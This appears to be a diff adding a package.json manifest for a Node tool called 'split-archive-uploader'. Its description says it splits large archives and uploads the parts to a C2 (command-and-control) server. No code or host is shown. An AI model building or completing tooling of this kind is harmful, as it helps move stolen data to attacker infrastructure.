@@ -1,0 +1,13 @@
+{
+  "name": "split-archive-uploader",
+  "version": "1.0.0",
+  "description": "Tool to split large archive and upload parts to C2 server",
+  "main": "split_archive_upload.js",
+  "scripts": {
+    "start": "node split_archive_upload.js"
+  },
+  "dependencies": {
+    "adm-zip": "^0.5.10",
+    "rimraf": "^3.0.2"
+  }
+}
